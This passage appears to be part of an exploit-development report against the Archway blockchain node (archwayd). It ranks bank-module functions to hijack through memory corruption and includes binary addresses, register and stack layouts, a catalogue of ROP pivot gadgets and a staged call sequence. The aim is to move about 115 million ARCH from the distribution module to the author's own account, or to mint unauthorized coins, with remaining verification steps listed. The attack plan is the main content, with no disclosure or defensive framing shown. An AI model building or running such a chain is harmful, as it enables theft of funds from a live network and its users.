   k.gasMeter(sdkCtx), gasLeft, costJSONDeserialization)`.
   `type QueryHandler struct { Ctx sdk.Context; Plugins WasmVMQueryHandler; Caller sdk.AccAddress; ... }`
   — a **heap object holding a full valid `sdk.Context`** that is alive for the whole wasm call
   (referenced via the cgo handle used for the `Querier` callback). A leaked pointer into it (or a
   pointer to the wasmd keeper's `bankKeeper` field inside `Plugins`) yields both prerequisites.
   `[MED]` (upstream wasmd v0.51.0 source; the Archway fork `v0.50.2-archway` was not fetched —
   [UNVERIFIED] that the fork is byte-identical here)
4. **Rich sender modules** (README §4, public LCD reads): `distribution` module = 115,302,678.954 ARCH;
   `mint` (Minter) is usually ~0; `gov`/treasury not spendable via CP. For rank 1/2 use
   `"distribution"`. `[HIGH]` (balance), `[MED]` (blocked-addr bitmap excludes it from receiving,
   not from sending)
5. **Denoms**: `"aarch"` is the native denom; amounts are 18-decimal integer strings
   (`100M ARCH = 10^26 aarch`, 87 bits → 2 limbs). `[HIGH]`
6. **Archway has no `AppendSendRestriction` and no `WithMintCoinsRestriction`** in the tree →
   no extra hook will veto the call; `mintCoinsRestrictionFn` is NoOp for the main bank keeper.
   `[MED]`

---

## 6. Ranked candidates — detail

### 6.1 Rank 1 — `(*BaseKeeper).SendCoinsFromModuleToAccount` @ `0x1cb4500` `[addresses HIGH / wrapper role UNVERIFIED]`
- **Signature**: `func (k *BaseKeeper) SendCoinsFromModuleToAccount(ctx context.Context, senderModule string, recipientAddr sdk.AccAddress, amt sdk.Coins) error` (wrapper form of the value method in §1.1).
- **Args**: RAX=ptr; RBX,RCX=ctx iface; RDI,RSI=module string; R8,R9,R10=recipient slice; stack(+8..+24)=amt slice header.
- **Required live objects**: (a) real `*BaseKeeper` box; (b) ctx itab + pointer to a Context with valid `ms` (tx cachemulti or root), `gasMeter`, `kvGasConfig`, `eventManager`; (c) module name in memory; (d) recipient 20-byte address; (e) one valid `sdk.Coin` (see §2.2).
- **Checks that will bite**: recipient bech32 must be valid for `.String()`; unknown module → panic (use `"distribution"`); insufficient module balance → plain error (use ≤115M ARCH); module account must exist (it does).
- **Hazards**: §4 all; `ms`/`gasMeter` are the hard dependencies; events append to the real event manager (allocation).
- **Why #1**: single call, attacker-directed, no supply touch, no permissions beyond module existence.

### 6.2 Rank 2 — `(*BaseSendKeeper).SendCoins` @ `0x1cadd00` (or `(*BaseKeeper).SendCoins` @ `0x1cb41e0`)
- **Signature**: `func (k *BaseSendKeeper) SendCoins(ctx context.Context, fromAddr, toAddr sdk.AccAddress, amt sdk.Coins) error`.
- **Args**: RAX=ptr; RBX,RCX=ctx; RDI,RSI,R8=from slice; R9,R10,R11=to slice; stack(+8..+24)=amt.
- **Required**: as rank 1 but **from = raw 20-byte module address** (precomputable: `sha256("distribution")[:20]`), no module map, **no `BlockedAddr` check**; event emission still needs `eventManager`.
- Trade-off vs #1: skips one interface call and the bech32 map lookup; needs correct 20 raw bytes staged (must match the account that actually holds the balance — a wrong encoding silently reads a zero balance and returns insufficient funds).

### 6.3 Rank 3 — `(*BaseKeeper).MintCoins` @ `0x1cb3720`
- **Signature**: `func (k *BaseKeeper) MintCoins(ctx context.Context, moduleName string, amounts sdk.Coins) error`; **all 8 arg words fit in registers, zero stack words** (MintCoins has no slice overflow once the receiver is a pointer).
- **Required**: as rank 1; `moduleName` must be a Minter-permission module (`"mint"`, or `"transfer"` on Archway per §1.5) that also exists; amounts valid (`Coins.IsValid` allows non-negative; use positive).
- **Effect**: bank balance of the module, bank supply both updated consistently; events emitted. This is the exact capability named by CWA-2026-006 ("unauthorized minting").
- **Extraction**: needs a second call in the same chain — rank 1 or 2 with `senderModule="mint"` — or the minted balance just sits there (it is not swept by `BeginBlocker`).

### 6.4 Rank 4 — `(*mintbankkeeper.Keeper).MintCoins` @ `0x2ae8a40` / `(*…).SendCoinsFromModuleToAccount` @ `0x2ae8b20`
- Signature: same as §1.5; pointer wrapper receiver = 1 word; value wrapper = `bankKeeper iface (RAX,RBX), rewardsKeeper iface (RCX,RDI)` then ctx `(RSI,R8)`, name `(R9,R10)`, amt slice `(R11)` — **amt spills 2–3 words to stack** because only 9 regs exist.
- Pure pass-through, no extra logic; its only advantage is the small receiver. Use when the leaked keeper pointer is to the mintbankkeeper box (reachable through `MintKeeper.bankKeeper`).

### 6.5 Rank 5–6 — leaf writes `setBalance` @ `0x1c60220`, `addCoins` @ `0x1c5fe00`
- Signatures in §1.1. **No pointer-receiver variant exists in the pclntab** `[MED]` (absence in artifact == expected for unexported methods; still flagged).
- Consequence: the caller must place a complete `BaseSendKeeper` image (incl. `Balances *IndexedMap` and the `sa` closure) into the callee's argument frame — only feasible once the chain can copy memory (e.g. leak + `rep movsb`/`duffcopy` gadgets; the E6c catalog has `mov`/write primitives but no verified full copy chain yet `[UNVERIFIED]`).
- `setBalance` is the single most surgical write in the whole bank module (one KV write + index); `addCoins` adds a read and an event. If a copy primitive materialises, rank 5 may jump above 3/4.

### 6.6 Ranks 7–10 (one-liners)
- `x/mint.BeginBlocker` @ `0x23c89a0`: `(ctx, keeper.Keeper // by value, ic func)`. Heavy receiver + a function pointer; outcome = normal inflation to fee collector. Use only if you want the mint to look like ordinary issuance, and you can supply a compatible `ic` (or a stub returning zero).
- `x/distribution.Keeper.FundCommunityPool` @ `0x21dfd80` / ptr @ `0x21f6c66`: `(ctx, amount sdk.Coins, sender sdk.AccAddress)` — pulls from sender.
- `msgServer` variants (`bank/keeper.(*msgServer).SendCoins` @ `0x1cba200` etc.): extra `sdk.AccAddressFromBech32` decode + protobuf msg staging; no permission advantage.
- **Raw KV route** `[UNVERIFIED keys]`: bank keys in v0.50 are collections: balances prefix `0x02`, supply prefix `0x00`; the balances value codec encodes `math.Int` as its **decimal string** (`BalanceValueCodec = NewAltValueCodec(sdk.IntValue, legacy Coin decoder)`). A raw `store.Set(key, value)` through the bank KVStore would bypass `supply` and account checks in one write — but requires a store pointer (`runtime.coreKVStore` / `cache.(*CommitKVStoreCache)`) and exact key framing (`0x02 + length-prefixed(addr) + denom`). `[MED]` (codec source via search fragment; tag verify pending)

### 6.7 Useful gadgets already catalogued (from `e8_gadgets.txt`) `[HIGH]`
```
0x31b6273 leave ; ret
0x4cd1da  mov %rsi,%rsp ; mov %eax,0x20(%rsp) ; pop %rbp ; ret
0x4cf020  mov %rbx,%rsp ; pop %rbp ; ret
0x2c74df1 lea -0x8(%rbp),%rsp ; pop %rbx ; pop %rbp ; ret
0x2ed35c9 mov %rbp,%rsp ; pop %rbp ; ret
0x40743d  call *%rbx      0x423e21 call *%rax      0x44f8ec jmp *%rax
```
Indirect-call gadgets are what will load the target from a staged qword; the `mov %rXX,%rsp`
gadgets are the first-stage pivot.

---

## 7. Minimal call sequence sketch — top candidate

**Target**: `(*BaseKeeper).SendCoinsFromModuleToAccount(*P_bank, ctx{itab_Context, P_ctx}, "distribution", attacker[20], coins{[aarch, A]})`.

**Preconditions (all leak-dependent)**:
- `P_bank` — pointer to the app's live `BaseKeeper` heap box (from E7 leak arrays; alternatives in §5.3).
- `itab_Context` — static address of `go:itab.Context,context.Context` (find in E8b by disassembling `sdk.UnwrapSDKContext`/call sites of keeper methods; it is a fixed constant in non-PIE text/rodata).
- `P_ctx` — pointer to a live or copied Context with real `ms`, `gasMeter`, `kvGasConfig`, `eventManager` (e.g. inside the live wasmd `QueryHandler.Ctx`; or a staged 872-byte fake whose `ms`/`gasMeter`/`eventManager` qwords are copied from a leaked real Context).

**Stage A — control/stack**:
1. Pivot: first-stage `jmp`/`ret` lands on `leave;ret` (`0x31b6273`) or `mov %rsi/%rbx,%rsp` (`0x4cd1da`/`0x4cf020`) so `RSP` points into the staged qword region near the top of the fiber stack.
2. Reserve ≥64 KiB below `RSP` (callee frames: 0x388–0xa58 measured; downstream chain adds more).
3. Put the **landing address** in `[RSP]` (used as the fake return PC), and the three `amt` stack words at `[RSP+8]`, `[RSP+16]`, `[RSP+24]`.

**Stage B — registers (in fixed order)**: `RAX=P_bank`, `RBX=itab_Context`, `RCX=P_ctx`, `RDI=&"distribution"` (12 B staged), `RSI=12`, `R8=&attacker` (20 B), `R9=20`, `R10=20`.

**Stage C — data** (staged qwords; can be laid out over several write-stream crossings / a second pivot):
```
modstr:  "distribution"                      ; 12 bytes
attacker: 20-byte pubkey-hash address        ; one's own account
denom:   "aarch"                             ; 5 bytes
limb[2]: little-endian limbs of A            ; e.g. 2 limbs for 10^26
bigint:  {neg=0, abs={&limb[0], 2, 2}}       ; 32 B
coin:    {Denom={&denom,5}, Amount=&bigint}  ; 24 B
coins:   {ptr=&coin, len=1, cap=1}           ; 24 B (registers/stack)
```

**Stage D — enter**: `jmp 0x1cb4500` (or `call` gadget), with `[RSP]` = landing.

**Stage E — land**: on return, `error` iface is in `RAX,RBX`; jump to a clean resumption point of the
suspended holder (E9) so wasmd returns success and the tx cache commits (§4.10). If the chosen
wrapper actually needs its receiver copied from `P_bank` and the wrapper entry semantics differ from
§2.4 (E8b), the fallback is the value body with the receiver image staged at `[RSP+8…]` before the
`jmp`.

**Two-step mint variant** (if the requirement is literally "mint"): same staging, first
`jmp 0x1cb3720` with `name="mint"`, then chain the second call (§6.3 + §6.1) using the returned
registers as a fresh stack frame.

---

## 8. Verification plan — what is UNVERIFIED and how to close it

V1. **Body vs wrapper roles and exact entry semantics** — [UNVERIFIED]. The current per-address
disassembly mixes split blocks and shows stack-arg loads at the pointer-variant entries, which is
inconsistent with a first-cut wrapper read. Fix: on CI, build the archway v10.1.0 module graph with
Go 1.23.5 (`go build -gcflags='-N -l'` optional) and dump `go tool objdump -s
'x/bank/keeper|mintbankkeeper'` on the *unstripped* build; codegen (registers, frames, wrappers)
is identical to the release binary even if addresses differ. Record: which symbol is a `JMP`-to-body
wrapper, prologue frame sizes, and the first 16 bytes of each entry.
V2. **Exact `sdk.Context` size/offset** — [UNVERIFIED]. CI program: declare a mirror struct with the
same field types/order as `types.Context` (all types importable), print `unsafe.Sizeof` and
`unsafe.Offsetof` per field; cross-check `reflect.TypeOf(sdk.Context{}).Size()`.
V3. **R14/g and stackguard sanity at the pivot** — [UNVERIFIED]. Harness test: at the hijack point,
capture `R14`, `RSP`, `0x10(%r14)` (stackguard0) and `0x0/0x8(%r14)` (stack lo/hi); assert
`stackguard0 < RSP` and print the delta to `stack_lo`.
V4. **itab address** (`go:itab.Context,context.Context`) — [UNVERIFIED]. Locate via E8b: instrument
`UnwrapSDKContext` call sites; or scan rodata for the itab layout `{inter, _type(type Context),
hash, _, fun[1] = pointer to Context.Value? …}` — simplest is a local build where the symbol is
named (`go tool nm`).
V5. **Fork equivalence of wasmd** — [UNVERIFIED]. Fetch `archway-network/archway-wasmd` at
`v0.50.2-archway`, `x/wasm/keeper/query_plugins.go` and `keeper.go`, and diff the
`QueryHandler`/`Execute` paths against upstream v0.51.0.
V6. **Balance-index side effects of `setBalance`** — [MED, code-read only]. Trace
`collections.IndexedMap.Set` at `cosmossdk.io/collections v0.4.0` for exact extra store ops.
V7. **No send restrictions on this build** — [MED]. Diff tag `v10.1.0` for `AppendSendRestriction`
and `WithMintCoinsRestriction` calls.

## 9. Sources

Primary (pinned tags):
- cosmos-sdk v0.50.10: `x/bank/keeper/keeper.go`, `send.go`, `view.go`; `x/mint/keeper/keeper.go`,
  `x/mint/abci.go`; `x/distribution/keeper/keeper.go`; `x/auth/keeper/keeper.go`;
  `types/context.go`; `types/coin.go`; `types/address.go`;
  https://github.com/cosmos/cosmos-sdk/tree/v0.50.10
- cosmossdk.io/math v1.3.0 `Int`: pkg.go.dev `cosmossdk.io/math@v1.3.0` and `math/int.go`
- cosmossdk.io/core v0.11.1 `header.Info` and `comet.BlockInfo`:
  https://github.com/cosmos/cosmos-sdk/tree/main/core/header, `core/comet`
- wasmd v0.51.0: `x/wasm/keeper/keeper.go`, `x/wasm/keeper/query_plugins.go`,
  https://github.com/CosmWasm/wasmd/tree/v0.51.0 — note Archway replaces it with
  `archway-network/archway-wasmd v0.50.2-archway`
- archway v10.1.0: `go.mod`, `app/app.go`, `x/rewards/mintbankkeeper/keeper.go`,
  https://github.com/archway-network/archway/tree/v10.1.0
- Go internal ABI spec (go1.23.5): https://go.dev/src/cmd/compile/abi-internal

Local/CI evidence:
- `archway/ci-artifacts/result-archway-mint/` (run 37616689073): `archwayd_functions.txt`,
  `e8_mint_candidates.txt`, `e8_ctx.txt`, `e8_runtime.txt`, `e8_gadgets.txt`
- fixed re-run (run 37618225107), artifact `ci-out/e8_target_disasm.txt`, `e8_xrefs.txt`;
  campaign log with binary sha256
- `archway/analysis/supply.json` (denom `aarch`), `archway/README.md` §4 (module balances)
